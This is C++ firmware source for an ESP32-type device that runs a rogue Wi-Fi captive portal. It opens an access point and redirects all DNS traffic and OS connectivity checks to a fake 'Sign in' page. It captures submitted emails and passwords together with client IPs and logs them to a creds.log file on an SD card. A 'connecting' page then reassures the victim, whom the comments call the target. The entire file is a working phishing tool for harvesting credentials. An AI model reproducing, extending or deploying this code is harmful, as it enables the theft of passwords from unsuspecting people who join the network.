#include "CaptivePortal.h"

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#include "../hw/Board.h"
#include "RadioManager.h"

namespace radio {
namespace captive {

namespace {
constexpr int MAX_SUBS = 64;

WebServer*   g_http = nullptr;
DNSServer*   g_dns  = nullptr;
TaskHandle_t g_task = nullptr;
bool         g_stop = false;
bool         g_running = false;
IPAddress    g_apIp(172, 0, 0, 1);

Submission   g_subs[MAX_SUBS];
int          g_subCount = 0;

const char LANDING_HTML[] PROGMEM = R"HTML(
<!doctype html><html><head><meta charset="utf-8"><title>Sign in</title>
<style>body{font-family:system-ui;max-width:420px;margin:40px auto;padding:0 16px}
h1{font-size:22px}input{width:100%;padding:10px;margin:8px 0;font-size:16px}
button{width:100%;padding:12px;font-size:16px;background:#007aff;color:#fff;border:0;border-radius:6px}
</style></head><body>
<h1>Sign in to continue</h1>
<form method="POST" action="/submit">
<label>Email or user</label><input name="u" autocomplete="username">
<label>Password</label><input name="p" type="password" autocomplete="current-password">
<button>Continue</button></form>
</body></html>)HTML";

// Map a filename extension to a Content-Type the browser will respect.
const char* contentTypeFor(const String& path) {
    if (path.endsWith(".html") || path.endsWith(".htm")) return "text/html";
    if (path.endsWith(".css"))  return "text/css";
    if (path.endsWith(".js"))   return "application/javascript";
    if (path.endsWith(".json")) return "application/json";
    if (path.endsWith(".png"))  return "image/png";
    if (path.endsWith(".jpg") || path.endsWith(".jpeg")) return "image/jpeg";
    if (path.endsWith(".gif"))  return "image/gif";
    if (path.endsWith(".svg"))  return "image/svg+xml";
    if (path.endsWith(".ico"))  return "image/x-icon";
    if (path.endsWith(".webp")) return "image/webp";
    if (path.endsWith(".woff2")) return "font/woff2";
    return "text/plain";
}

// Serve `/portal/<uri>` from SD if available, else fall back to the
// built-in inline form. `/` maps to `/portal/index.html`.
bool serveFromSd(const String& uri) {
    if (!board::sdMounted()) return false;
    String rel = uri;
    if (rel == "/" || rel.length() == 0) rel = "/index.html";
    String sdPath = String("/portal") + rel;
    if (!SD.exists(sdPath.c_str())) return false;
    File f = SD.open(sdPath.c_str(), FILE_READ);
    if (!f) return false;
    g_http->streamFile(f, contentTypeFor(sdPath));
    f.close();
    return true;
}

void sendLanding() {
    if (serveFromSd("/")) return;
    g_http->send(200, "text/html", LANDING_HTML);
}

void handleRoot() { sendLanding(); }

// Append a captured credential to a single rolling log on SD, one line per
// submission: "U: <email> P: <password>". No timestamp — this board has no
// reliable clock (only a build-time seed) unless NTP has run, so a date would
// be misleading. The captive portal owns the Wifi radio, not the SPI radios
// (CC1101/NRF24), so the SD bus is free here and the card stays mounted; we
// keep the file open only long enough to append + flush.
void appendCredToSd(const String& user, const String& pass) {
    if (!board::sdMounted()) return;
    if (!SD.exists("/capture"))        SD.mkdir("/capture");
    if (!SD.exists("/capture/portal")) SD.mkdir("/capture/portal");
    File f = SD.open("/capture/portal/creds.log", FILE_APPEND);
    if (!f) return;
    // Collapse any CR/LF in the submitted values so a crafted field can't
    // break the one-line-per-capture format.
    String u = user; u.replace('\n', ' '); u.replace('\r', ' ');
    String p = pass; p.replace('\n', ' '); p.replace('\r', ' ');
    f.printf("U: %s P: %s\n", u.c_str(), p.c_str());
    f.close();
}

void handleSubmit() {
    String user = g_http->arg("u");
    String pass = g_http->arg("p");
    // In-memory list backs the on-screen scrollback and is capped at MAX_SUBS;
    // the SD log is unbounded — keep appending every capture past the cap.
    if (g_subCount < MAX_SUBS) {
        auto& s = g_subs[g_subCount++];
        s.user = user;
        s.pass = pass;
        s.clientIp = g_http->client().remoteIP().toString();
        s.ms = millis();
    }
    appendCredToSd(user, pass);
    // After capture, serve a "connecting" page. Prefer a template on SD
    // (post.html) if provided — lets the operator customize what the
    // target sees after submitting.
    if (serveFromSd("/post.html")) return;
    g_http->send(200, "text/html",
        "<html><body><h2>One moment…</h2>"
        "<p>Connecting you to the network.</p></body></html>");
}

void handleGeneric204() { sendLanding(); }

void handleNotFound() {
    // Try the requested path as an asset on SD (so /style.css, /logo.png
    // etc. drop cleanly from the template folder). Fall back to the
    // landing page for anything unknown — matches real captive portals.
    if (serveFromSd(g_http->uri())) return;
    sendLanding();
}

void taskEntry(void*) {
    while (!g_stop) {
        if (g_dns)  g_dns->processNextRequest();
        if (g_http) g_http->handleClient();
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    g_task = nullptr;
    vTaskDelete(nullptr);
}
} // namespace

bool start(const String& ssid) {
    if (!radio::acquire(radio::Owner::Wifi)) return false;

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(g_apIp, g_apIp, IPAddress(255,255,255,0));
    WiFi.softAP(ssid.c_str());

    g_dns = new DNSServer();
    g_dns->start(53, "*", g_apIp);

    g_http = new WebServer(80);
    g_http->on("/",                handleRoot);
    g_http->on("/submit",          HTTP_POST, handleSubmit);
    g_http->on("/generate_204",    handleGeneric204); // Android
    g_http->on("/hotspot-detect.html", handleGeneric204); // iOS
    g_http->on("/ncsi.txt",        handleGeneric204); // Windows
    g_http->onNotFound(handleNotFound);
    g_http->begin();

    g_subCount = 0;
    g_stop = false;
    g_running = true;
    xTaskCreatePinnedToCore(taskEntry, "captive", 8192, nullptr,
                            /*prio=*/1, &g_task, /*coreId=*/1);
    return true;
}

void stop() {
    if (!g_running) return;
    g_stop = true;
    for (int i = 0; i < 30 && g_task; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    if (g_http) { g_http->close(); delete g_http; g_http = nullptr; }
    if (g_dns)  { g_dns->stop();  delete g_dns;  g_dns  = nullptr; }
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    g_running = false;
    radio::release(radio::Owner::Wifi);
}

bool        running()        { return g_running; }
int         submissionCount(){ return g_subCount; }
Submission  submissionAt(int i){ return (i>=0 && i<g_subCount) ? g_subs[i] : Submission{}; }
int         clientCount()    { return WiFi.softAPgetStationNum(); }

} // namespace captive
} // namespace radio
